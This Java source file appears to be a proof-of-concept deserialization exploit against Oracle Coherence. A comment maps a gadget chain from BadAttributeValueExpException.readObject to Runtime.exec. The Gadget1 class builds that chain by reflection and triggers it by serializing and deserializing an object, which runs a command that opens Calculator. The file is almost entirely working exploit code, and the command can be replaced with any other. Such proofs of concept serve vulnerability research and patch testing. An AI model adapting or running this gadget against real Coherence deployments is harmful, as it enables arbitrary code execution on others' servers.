import com.sleepycat.persist.evolve.Mutations;
import com.tangosol.coherence.reporter.extractor.ConstantExtractor;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.concurrent.Callable;
import java.util.concurrent.ConcurrentNavigableMap;
import java.util.concurrent.ConcurrentSkipListMap;

/**
 * javax.management.BadAttributeValueExpException.readObject()
 *   com.tangosol.internal.sleepycat.persist.evolve.Mutations.toString()
 *     java.util.concurrent.ConcurrentSkipListMap$SubMap.size()
 *     java.util.concurrent.ConcurrentSkipListMap$SubMap.isBeforeEnd()
 *       java.util.concurrent.ConcurrentSkipListMap.cpr()
 *         com.tangosol.util.comparator.ExtractorComparator.compare()
 *           com.tangosol.util.extractor.ChainedExtractor.extract()
 *           com.tangosol.util.extractor.ReflectionExtractor().extract()
 *             Method.invoke()
 *             //...
 *           com.tangosol.util.extractor.ReflectionExtractor().extract()
 *             Method.invoke()
 *               Runtime.exec()
 */

public class Gadget1 {

    public static void getObjectBytes() throws Exception {
        String command = "open /System/Applications/Calculator.app";
        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                new ConstantExtractor(Runtime.class),
                new ReflectionExtractor("getMethod", new Object[]{"getRuntime", new Class[0]}),
                new ReflectionExtractor("invoke", new Object[]{null, new Object[0]}),
                new ReflectionExtractor("exec", new Object[]{command})
        };

        ChainedExtractor chainedExtractor = new ChainedExtractor(valueExtractors);

        ExtractorComparator extractorComparator = new ExtractorComparator<Object>();
        Field m_extractor = extractorComparator.getClass().getDeclaredField("m_extractor");
        m_extractor.setAccessible(true);
        m_extractor.set(extractorComparator, chainedExtractor);

        ConcurrentSkipListMap concurrentSkipListMap = new ConcurrentSkipListMap<String, String>();
        Field comparator = concurrentSkipListMap.getClass().getDeclaredField("comparator");
        comparator.setAccessible(true);
        comparator.set(concurrentSkipListMap, extractorComparator);

        ConcurrentNavigableMap subMap = concurrentSkipListMap.subMap("foo", false, "bar", false);

        // crafted Mutations Object
        Mutations mutations = new Mutations();
        Field renamers = mutations.getClass().getDeclaredField("renamers");
        renamers.setAccessible(true);
        renamers.set(mutations, subMap);

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        valfield.setAccessible(true);
        valfield.set(val, mutations);

        Deserializer.deserialize(Serializer.serialize(val));
    }

    public static void main(String[] args) throws Exception {
        getObjectBytes();
    }

    static class Deserializer implements Callable<Object> {
        private final byte[] bytes;

        public Deserializer(byte[] bytes) { this.bytes = bytes; }

        public Object call() throws Exception {
            return deserialize(bytes);
        }

        public static Object deserialize(final byte[] serialized) throws IOException, ClassNotFoundException {
            final ByteArrayInputStream in = new ByteArrayInputStream(serialized);
            return deserialize(in);
        }

        public static Object deserialize(final InputStream in) throws ClassNotFoundException, IOException {
            final ObjectInputStream objIn = new ObjectInputStream(in);
            return objIn.readObject();
        }
    }

    static class Serializer implements Callable<byte[]> {
        private final Object object;
        public Serializer(Object object) {
            this.object = object;
        }

        public byte[] call() throws Exception {
            return serialize(object);
        }

        public static byte[] serialize(final Object obj) throws IOException {
            final ByteArrayOutputStream out = new ByteArrayOutputStream();
            serialize(obj, out);
            return out.toByteArray();
        }

        public static void serialize(final Object obj, final OutputStream out) throws IOException {
            final ObjectOutputStream objOut = new ObjectOutputStream(out);
            objOut.writeObject(obj);
        }

    }

}


